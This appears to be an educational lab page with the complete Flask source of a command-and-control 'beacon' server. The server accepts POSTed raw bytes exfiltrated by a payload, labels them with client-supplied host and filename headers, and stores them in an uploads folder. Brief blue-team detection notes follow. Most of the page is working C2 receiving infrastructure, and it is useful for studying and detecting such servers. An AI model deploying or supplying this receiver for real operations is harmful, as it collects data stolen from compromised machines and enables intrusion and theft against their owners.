C2 Beacon Receiver — Source Code

This is the server-side Flask script used in the lab to receive beacon callbacks from the payload. It listens for POST requests on /beacon, reads the raw bytes from the request body, and saves them to an uploads folder with a timestamp. This is for educational analysis only — it demonstrates how C2 infrastructure receives exfiltrated data.

How it works

  • Client sends raw bytes via POST to /beacon
  • Optional headers X-Filename and X-Host identify the file and client
  • Server saves the file with a timestamp prefix to the uploads folder
  • Returns a JSON response confirming receipt and file size

Source Code


from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/", methods=["GET"])
def test():
    return "C2 Server OK - use POST /beacon"

@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_data()

    if not data:
        return jsonify({"status": "error", "reason": "empty body"}), 400

    fname_hdr = request.headers.get("X-Filename", "recon_combined.txt")
    host_id   = request.headers.get("X-Host", "unknown_host")

    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_name = fname_hdr.replace("\\", "_").replace("/", "_")
    out_name  = f"{host_id}_{timestamp}_{safe_name}"

    out_path = os.path.join(UPLOAD_FOLDER, out_name)
    with open(out_path, "wb") as f:
        f.write(data)

    return jsonify({
        "status":     "ok",
        "saved_as":   out_name,
        "size_bytes": len(data),
    }), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

Blue Team Notes

When analysing this server-side component look for:

  • Unusual POST requests to non-standard endpoints
  • Raw binary body with custom headers like X-Host
  • Flask debug mode enabled — a sign of a hastily deployed C2
  • Files appearing in an uploads directory with timestamp naming patterns
